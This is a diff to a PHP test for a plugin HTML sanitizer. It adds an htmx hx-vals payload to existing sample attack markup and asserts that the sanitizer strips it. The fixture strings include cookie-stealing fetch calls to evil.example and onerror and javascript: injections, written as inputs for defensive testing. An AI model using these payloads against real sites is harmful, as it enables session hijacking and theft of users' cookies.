@@ -112,6 +112,8 @@ final class PluginSettingsPageRenderingTest extends KernelTestCase
             .'<script>fetch("https://evil.example/steal?c="+document.cookie)</script>'
             .'<img src="x" onerror="alert(1)">'
             .'<a href="javascript:alert(1)">Authorize</a>'
+            .'<div hx-get="/health" hx-trigger="load" '
+            .'hx-vals="js:fetch(\'https://evil.example/?c=\'+document.cookie)"></div>'
             .'</div>';
 
         $content = (new PluginHtmlSanitizer())->sanitize($rawPluginMarkup);
@@ -123,6 +125,10 @@ final class PluginSettingsPageRenderingTest extends KernelTestCase
         $this->assertStringNotContainsString('evil.example', $content);
         $this->assertStringNotContainsString('onerror', $content);
         $this->assertStringNotContainsString('javascript:', $content);
+        // hx-vals's value is evaluated as JavaScript by htmx when it carries a `js:` prefix — the
+        // same risk class as onclick=, so the attribute must never reach the rendered page even
+        // though it matches the hx-* prefix htmx-driven markup is otherwise allowed to keep.
+        $this->assertStringNotContainsString('hx-vals', $content);
 
         /** @var Environment $twig */
         $twig = self::getContainer()->get('twig');
